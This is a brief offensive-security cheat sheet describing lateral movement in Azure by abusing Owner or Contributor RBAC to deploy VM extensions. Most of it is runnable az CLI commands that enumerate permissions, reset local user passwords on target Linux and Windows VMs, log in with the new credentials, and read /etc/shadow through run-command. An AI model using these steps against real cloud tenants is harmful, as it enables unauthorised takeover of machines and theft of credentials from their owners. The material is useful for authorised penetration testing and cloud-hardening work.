# Azure VM Extension – Lateral Movement via Owner RBAC

If a managed identity (or account) has `Owner` or `Contributor` RBAC over another VM, deploy a VM extension to run arbitrary commands as the VM's local admin/root — effectively resetting credentials or executing a shell.

```bash
# From a VM with managed identity:
az login --identity

# Check what resources/VMs the identity has Owner on
az role assignment list --assignee $(az account show --query id -o tsv) -o table
# Or enumerate the resource group
az vm list -g <resource-group> -o table

# Deploy the CustomScript extension to reset a user's password on the target VM
az vm extension set \
  --resource-group <RG> \
  --vm-name <TARGET-VM> \
  --name customScript \
  --publisher Microsoft.Azure.Extensions \
  --settings '{"commandToExecute":"echo <user>:<new-pass> | chpasswd"}'
# For Windows:
az vm extension set \
  --resource-group <RG> \
  --vm-name <TARGET-VM> \
  --name CustomScriptExtension \
  --publisher Microsoft.Compute \
  --settings "{\"commandToExecute\":\"net user <user> <new-pass>\"}"

# Connect to the target VM with the reset password
ssh <user>@<target-public-ip>
```

Extensions run as SYSTEM/root on the target VM. The `run-command` API can also be used:

```bash
az vm run-command invoke --resource-group <RG> --name <TARGET-VM> \
  --command-id RunShellScript \
  --scripts "cat /etc/shadow"
```
